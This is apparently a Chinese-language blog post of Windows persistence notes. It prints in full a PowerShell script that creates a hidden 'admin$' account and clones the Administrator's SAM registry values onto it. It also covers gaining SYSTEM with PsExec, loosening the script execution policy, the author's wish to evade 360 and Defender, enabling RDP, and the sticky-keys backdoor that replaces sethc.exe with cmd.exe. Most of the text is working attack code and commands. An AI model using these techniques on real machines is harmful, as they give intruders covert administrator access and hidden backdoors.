<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202407170918846.webp" alt="image-20240717091837675" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202407170918846.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202407170918846.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202407170918846.webp?size=large 2x" data-title="image-20240717091837675" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
<h2 id="8脚本自动化" class="heading-element"><span>8、脚本自动化</span>
  <a href="#8%e8%84%9a%e6%9c%ac%e8%87%aa%e5%8a%a8%e5%8c%96" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><blockquote>
<p><a href="https://raw.githubusercontent.com/3gstudent/Windows-User-Clone/master/Windows-User-Clone.ps1"target="_blank" rel="external nofollow noopener noreferrer">https://raw.githubusercontent.com/3gstudent/Windows-User-Clone/master/Windows-User-Clone.ps1</a></p>
<p>PS C:&gt;.\Windows-User-Clone_ps1.ps1</p>
<pre tabindex="0"><code>powershell -File Windows-User-Clone_ps1.ps1</code></pre></blockquote>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#ff636f">function</span> <span style="color:#58a1dd">Create-Clone</span>
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">&lt;#
</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">.</span><span style="color:#a6be9d">SYNOPSIS</span><span style="color:#828b96;font-style:italic">
</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">This script requires System privileges. You can use Invoke-TokenManipulation.ps1 to get System privileges and create the clone user.
</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">Link: https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-TokenManipulation.ps1
</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">
</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">Author: Evilcg and 3gstuent
</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">Evilcg&#39;s way to achieve the same goal:
</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">https://github.com/Ridter/Pentest/blob/master/powershell/MyShell/Create-Clone.ps1
</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">
</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">.PARAMETER u
</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">The clone username
</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">.PARAMETER p
</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">The clone user&#39;s password
</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">.PARAMETER cu
</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">The user to be cloned, default administrator 
</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">.</span><span style="color:#a6be9d">EXAMPLE</span><span style="color:#828b96;font-style:italic">
</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">Create-Clone -u abc -p abc123 -cu administrator
</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">#&gt;</span>
</span></span><span style="display:flex;"><span>     <span style="color:#ff636f">Param</span>(
</span></span><span style="display:flex;"><span>        [<span style="color:#58a1dd">Parameter</span>(<span style="color:#58a1dd">Mandatory</span>=<span style="color:#58a1dd">$true</span>)]
</span></span><span style="display:flex;"><span>        [<span style="color:#58a1dd">String</span>]
</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">$u</span>,
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        [<span style="color:#58a1dd">Parameter</span>(<span style="color:#58a1dd">Mandatory</span>=<span style="color:#58a1dd">$true</span>)]
</span></span><span style="display:flex;"><span>        [<span style="color:#58a1dd">String</span>]
</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">$p</span>,
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        [<span style="color:#58a1dd">Parameter</span>(<span style="color:#58a1dd">Mandatory</span>=<span style="color:#58a1dd">$false</span>)]
</span></span><span style="display:flex;"><span>        [<span style="color:#58a1dd">String</span>]
</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">$cu</span> = <span style="color:#a6be9d">&#34;administrator&#34;</span>
</span></span><span style="display:flex;"><span>    )
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">function</span> <span style="color:#58a1dd">Create-user</span> ([<span style="color:#58a1dd">string</span>]<span style="color:#58a1dd">$Username</span>,[<span style="color:#58a1dd">string</span>]<span style="color:#58a1dd">$Password</span>) 
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">$group</span> = <span style="color:#a6be9d">&#34;Administrators&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">$adsi</span> = [<span style="color:#58a1dd">ADSI</span>]<span style="color:#a6be9d">&#34;WinNT://</span><span style="color:#58a1dd">$env:COMPUTERNAME</span><span style="color:#a6be9d">&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">$existing</span> = <span style="color:#58a1dd">$adsi</span>.<span style="color:#58a1dd">Children</span> | <span style="color:#58a1dd">where </span>{<span style="color:#58a1dd">$_</span>.<span style="color:#58a1dd">SchemaClassName</span> <span style="color:#ff636f">-eq</span> <span style="color:#a6be9d">&#39;user&#39;</span> <span style="color:#ff636f">-and</span> <span style="color:#58a1dd">$_</span>.<span style="color:#58a1dd">Name</span> <span style="color:#ff636f">-eq</span> <span style="color:#58a1dd">$Username</span> }
</span></span><span style="display:flex;"><span>        <span style="color:#ff636f">if</span> (<span style="color:#58a1dd">$existing</span> <span style="color:#ff636f">-eq</span> <span style="color:#58a1dd">$null</span>) {
</span></span><span style="display:flex;"><span>            <span style="color:#58a1dd">Write-Host</span> <span style="color:#a6be9d">&#34;Creating new local user </span><span style="color:#58a1dd">$Username</span><span style="color:#a6be9d"> with password </span><span style="color:#58a1dd">$Password</span><span style="color:#a6be9d">&#34;</span>
</span></span><span style="display:flex;"><span>            &amp; <span style="color:#58a1dd">NET</span> <span style="color:#58a1dd">USER</span> <span style="color:#58a1dd">$Username</span> <span style="color:#58a1dd">$Password</span> /<span style="color:#58a1dd">add</span> /<span style="color:#58a1dd">y</span> /<span style="color:#58a1dd">expires</span>:<span style="color:#58a1dd">never</span> | <span style="color:#58a1dd">Out-Null</span>
</span></span><span style="display:flex;"><span>            <span style="color:#58a1dd">Write-Host</span> <span style="color:#a6be9d">&#34;Adding local user </span><span style="color:#58a1dd">$Username</span><span style="color:#a6be9d"> to </span><span style="color:#58a1dd">$group</span><span style="color:#a6be9d">.&#34;</span>
</span></span><span style="display:flex;"><span>            &amp; <span style="color:#58a1dd">NET</span> <span style="color:#58a1dd">LOCALGROUP</span> <span style="color:#58a1dd">$group</span> <span style="color:#58a1dd">$Username</span> /<span style="color:#58a1dd">add</span> | <span style="color:#58a1dd">Out-Null</span>
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#ff636f">else</span> {
</span></span><span style="display:flex;"><span>            <span style="color:#58a1dd">Write-Host</span> <span style="color:#a6be9d">&#34;[*] Setting password for existing local user </span><span style="color:#58a1dd">$Username</span><span style="color:#a6be9d">&#34;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#58a1dd">$existing</span>.<span style="color:#58a1dd">SetPassword</span>(<span style="color:#58a1dd">$Password</span>)           
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">Write-Host</span> <span style="color:#a6be9d">&#34;[*] Ensuring password for </span><span style="color:#58a1dd">$Username</span><span style="color:#a6be9d"> never expires&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">WMIC</span> <span style="color:#58a1dd">USERACCOUNT</span> <span style="color:#58a1dd">WHERE </span><span style="color:#a6be9d">&#34;Name=&#39;</span><span style="color:#58a1dd">$Username</span><span style="color:#a6be9d">&#39;&#34;</span> <span style="color:#58a1dd">SET </span><span style="color:#58a1dd">PasswordExpires</span>=<span style="color:#58a1dd">FALSE</span>
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">function</span> <span style="color:#58a1dd">GetUser-Key([string]$user</span>)
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">cmd</span> /<span style="color:#58a1dd">c</span> <span style="color:#a6be9d">&#34;regedit /e </span><span style="color:#58a1dd">$env:temp</span><span style="color:#a6be9d">\</span><span style="color:#58a1dd">$user</span><span style="color:#a6be9d">.reg &#34;</span><span style="color:#58a1dd">HKEY_LOCAL_MACHINE</span>\<span style="color:#58a1dd">SAM</span>\<span style="color:#58a1dd">SAM</span>\<span style="color:#58a1dd">Domains</span>\<span style="color:#58a1dd">Account</span>\<span style="color:#58a1dd">Users</span>\<span style="color:#58a1dd">Names</span>\<span style="color:#58a1dd">$user</span><span style="color:#a6be9d">&#34;&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">$file</span> = <span style="color:#58a1dd">Get-Content</span> <span style="color:#a6be9d">&#34;</span><span style="color:#58a1dd">$env:temp</span><span style="color:#a6be9d">\</span><span style="color:#58a1dd">$user</span><span style="color:#a6be9d">.reg&#34;</span>  | <span style="color:#58a1dd">Out-String</span>
</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">$pattern</span>=<span style="color:#a6be9d">&#34;@=hex\((.*?)\)\:&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">$file</span> <span style="color:#ff636f">-match</span> <span style="color:#58a1dd">$pattern</span> |<span style="color:#58a1dd">Out-Null</span>
</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">$key</span> = <span style="color:#a6be9d">&#34;00000&#34;</span>+<span style="color:#58a1dd">$matches</span>[<span style="color:#a6be9d">1</span>]
</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">Write-Host</span> <span style="color:#58a1dd">$key</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff636f">return</span> <span style="color:#58a1dd">$key</span>
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">function</span> <span style="color:#58a1dd">Clone</span> ([<span style="color:#58a1dd">string</span>]<span style="color:#58a1dd">$ukey</span>,[<span style="color:#58a1dd">string</span>]<span style="color:#58a1dd">$cukey</span>) 
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">$ureg</span> = <span style="color:#a6be9d">&#34;HKLM:\SAM\SAM\Domains\Account\Users\</span><span style="color:#58a1dd">$ukey</span><span style="color:#a6be9d">&#34;</span> |<span style="color:#58a1dd">Out-String</span>
</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">$cureg</span> = <span style="color:#a6be9d">&#34;HKLM:\SAM\SAM\Domains\Account\Users\</span><span style="color:#58a1dd">$cukey</span><span style="color:#a6be9d">&#34;</span> |<span style="color:#58a1dd">Out-String</span>       
</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">$cuFreg</span> = <span style="color:#58a1dd">Get-Item</span> <span style="color:#58a1dd">-Path</span> <span style="color:#58a1dd">$cureg</span>.<span style="color:#58a1dd">Trim</span>()
</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">$cuFvalue</span> = <span style="color:#58a1dd">$cuFreg</span>.<span style="color:#58a1dd">GetValue</span>(<span style="color:#a6be9d">&#39;F&#39;</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">Set-ItemProperty</span> <span style="color:#58a1dd">-path</span> <span style="color:#58a1dd">$ureg</span>.<span style="color:#58a1dd">Trim</span>()  <span style="color:#58a1dd">-Name</span> <span style="color:#a6be9d">&#34;F&#34;</span> <span style="color:#58a1dd">-value</span> <span style="color:#58a1dd">$cuFvalue</span>
</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">$outreg</span> = <span style="color:#a6be9d">&#34;HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\</span><span style="color:#58a1dd">$ukey</span><span style="color:#a6be9d">&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">cmd</span> /<span style="color:#58a1dd">c</span> <span style="color:#a6be9d">&#34;regedit /e </span><span style="color:#58a1dd">$env:temp</span><span style="color:#a6be9d">\out.reg </span><span style="color:#58a1dd">$outreg</span><span style="color:#a6be9d">.Trim()&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">Write-Host</span> <span style="color:#a6be9d">&#34;Copy from </span><span style="color:#58a1dd">$cu</span><span style="color:#a6be9d"> to </span><span style="color:#58a1dd">$u</span><span style="color:#a6be9d"> success.&#34;</span>
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">function</span> <span style="color:#58a1dd">Main</span> () 
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">Write-Host</span> <span style="color:#a6be9d">&#34;[*] Current token: &#34;</span>  <span style="color:#58a1dd">-NoNewline</span>
</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">$token</span>=<span style="color:#58a1dd">whoami</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff636f">if</span>(<span style="color:#58a1dd">$token</span> <span style="color:#ff636f">-ne</span> <span style="color:#a6be9d">&#34;nt authority\system&#34;</span>)
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>            <span style="color:#58a1dd">Write-Host</span> <span style="color:#a6be9d">&#34;  &#34;</span> <span style="color:#58a1dd">$token</span>
</span></span><span style="display:flex;"><span>            <span style="color:#58a1dd">Write-Host</span> <span style="color:#a6be9d">&#34;[!] Low privileges.&#34;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#58a1dd">Write-Host</span> <span style="color:#a6be9d">&#34;[*] Exit.&#34;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#58a1dd">Exit</span>
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#ff636f">else</span> 
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>            <span style="color:#58a1dd">Write-Host</span> <span style="color:#58a1dd">$token</span>
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">Write-Host</span> <span style="color:#a6be9d">&#34;[*] Create User...&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">Create-user</span> <span style="color:#58a1dd">$u</span> <span style="color:#58a1dd">$p</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">Write-Host</span> <span style="color:#a6be9d">&#34;[*] Get User </span><span style="color:#58a1dd">$u</span><span style="color:#a6be9d">&#39;s Key: &#34;</span>  <span style="color:#58a1dd">-NoNewline</span>
</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">$ukey</span> = <span style="color:#58a1dd">GetUser-Key</span> <span style="color:#58a1dd">$u</span> |<span style="color:#58a1dd">Out-String</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">Write-Host</span> <span style="color:#a6be9d">&#34;[*] Get User </span><span style="color:#58a1dd">$cu</span><span style="color:#a6be9d">&#39;s Key: &#34;</span>  <span style="color:#58a1dd">-NoNewline</span>
</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">$cukey</span> = <span style="color:#58a1dd">GetUser-Key</span> <span style="color:#58a1dd">$cu</span> |<span style="color:#58a1dd">Out-String</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">Write-Host</span> <span style="color:#a6be9d">&#34;[*] Try to clone...&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">Clone</span> <span style="color:#58a1dd">$ukey</span> <span style="color:#58a1dd">$cukey</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">Write-Host</span> <span style="color:#a6be9d">&#34;[*] Delete User:</span><span style="color:#58a1dd">$u</span><span style="color:#a6be9d">&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">Net</span> <span style="color:#58a1dd">User</span> <span style="color:#58a1dd">$u</span> /<span style="color:#58a1dd">del </span>|<span style="color:#58a1dd">Out-Null</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">Write-Host</span> <span style="color:#a6be9d">&#34;[*] Import the registry&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">cmd</span> /<span style="color:#58a1dd">c</span> <span style="color:#a6be9d">&#34;regedit /s </span><span style="color:#58a1dd">$env:temp</span><span style="color:#a6be9d">\</span><span style="color:#58a1dd">$u</span><span style="color:#a6be9d">.reg&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">cmd</span> /<span style="color:#58a1dd">c</span> <span style="color:#a6be9d">&#34;regedit /s </span><span style="color:#58a1dd">$env:temp</span><span style="color:#a6be9d">\out.reg&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">Write-Host</span> <span style="color:#a6be9d">&#34;[*] Clearn&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">Remove-Item</span> <span style="color:#58a1dd">$env:temp</span>\*.<span style="color:#58a1dd">reg</span>
</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">Write-Output</span> <span style="color:#a6be9d">&#34;[*] All Done.&#34;</span>
</span></span><span style="display:flex;"><span>    }    
</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">Main</span>   
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">Create-Clone</span> <span style="color:#58a1dd">-u</span> <span style="color:#58a1dd">admin</span>$ <span style="color:#58a1dd">-p</span> <span style="color:#58a1dd">Aa123456</span>...</span></span></code></pre></div><h2 id="试验-被拦截" class="heading-element"><span>试验-被拦截</span>
  <a href="#%e8%af%95%e9%aa%8c-%e8%a2%ab%e6%8b%a6%e6%88%aa" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p>试了下执行不了，是因为对poweishell的脚本是限制的</p>
<pre tabindex="0"><code>get-executionpolicy</code></pre><p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202407220942334.webp" alt="image-20240722094230138" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202407220942334.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202407220942334.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202407220942334.webp?size=large 2x" data-title="image-20240722094230138" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
<p>以管理员身份打开 <code>PowerShell</code> 输入 <code>set-executionpolicy remotesigned</code>，并输入Y，解除对ps1的限制。</p>
<pre tabindex="0"><code>PS C:\WINDOWS\system32&gt; set-executionpolicy remotesigned

执行策略更改
执行策略可帮助你防止执行不信任的脚本。更改执行策略可能会产生安全风险，如 https:/go.microsoft.com/fwlink/?LinkID=135170
中的 about_Execution_Policies 帮助主题所述。是否要更改执行策略?
[Y] 是(Y)  [A] 全是(A)  [N] 否(N)  [L] 全否(L)  [S] 暂停(S)  [?] 帮助 (默认值为“N”): y
PS C:\WINDOWS\system32&gt; get-executionpolicy
RemoteSigned</code></pre><p>这个操作需要system权限</p>
<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202407220943439.webp" alt="image-20240722094346318" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202407220943439.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202407220943439.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202407220943439.webp?size=large 2x" data-title="image-20240722094346318" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
<p>搞一个PsExec过去，然后</p>
<pre tabindex="0"><code>PsExec.exe -i -s cmd</code></pre><p>就可以得到一个system权限的cmd</p>
<pre tabindex="0"><code>PS C:&gt;.\Windows-User-Clone_ps1.ps1

powershell -File Windows-User-Clone_ps1.ps1</code></pre><p>360直接杀的</p>
<p>defender也杀</p>
<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202407220957052.webp" alt="image-20240722095749919" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202407220957052.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202407220957052.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202407220957052.webp?size=large 2x" data-title="image-20240722095749919" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
<p>让他允许看看</p>
<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202407221001642.webp" alt="image-20240722100105467" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202407221001642.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202407221001642.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202407221001642.webp?size=large 2x" data-title="image-20240722100105467" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
<p>连接远程桌面还踩了个坑，注册表里改成允许以后，还要添加允许连接的用户，还要再防火墙里入站规则里把3389那个改成公用网络</p>
<p>总的来说还是对注册表进行操作，但是这方法会被杀，不知道有没有免杀的途径</p>
<h1 id="辅助功能镜像劫持" class="heading-element"><span>辅助功能镜像劫持</span>
  <a href="#%e8%be%85%e5%8a%a9%e5%8a%9f%e8%83%bd%e9%95%9c%e5%83%8f%e5%8a%ab%e6%8c%81" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h1><p>为了使电脑更易于使用和访问，Windows 添加了一些辅助功能。这些功能可以在用户登录之前以组合键启动。根据这个特征，一些恶意软件无需登录到系统，通过远程桌面协议就可以执行恶意代码。</p>
<p>比如<strong>最常见的按5下shift出现的粘滞键Sethc.exe（shift后门）</strong>，还有Windows + U组合键时启动的utilman.exe程序</p>
<pre tabindex="0"><code>屏幕键盘：C:\Windows\System32\osk.exe
放大镜：C:\Windows\System32\Magnify.exe
旁白：C:\Windows\System32\Narrator.exe
显示切换器 C:\Windows\System32\DisplaySwitch.exe
应用切换器：C:\Windows\System32\AtBroker.exe</code></pre><h2 id="低版本" class="heading-element"><span>低版本</span>
  <a href="#%e4%bd%8e%e7%89%88%e6%9c%ac" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p>在较早的 Windows 版本，只需要进行简单的二进制文件替换，比如经典的shift后门是将<code>C:\Windows\System32\sethc.exe</code>替换为<code>cmd.exe</code>。</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#58a1dd">cd </span><span style="color:#58a1dd">WINDOWS</span>\<span style="color:#58a1dd">system32</span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">move </span><span style="color:#58a1dd">sethc</span>.<span style="color:#58a1dd">exe</span> <span style="color:#58a1dd">sethc</span>.<span style="color:#58a1dd">exe</span>.<span style="color:#58a1dd">bak</span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">copy </span><span style="color:#58a1dd">cmd</span>.<span style="color:#58a1dd">exe</span> <span style="color:#58a1dd">sethc</span>.<span style="color:#58a1dd">exe</span></span></span></code></pre></div><p>直接按5次shift键弹出cmd窗口，可直接以system权限执行系统命令，创建管理员用户，登录服务器等。</p>
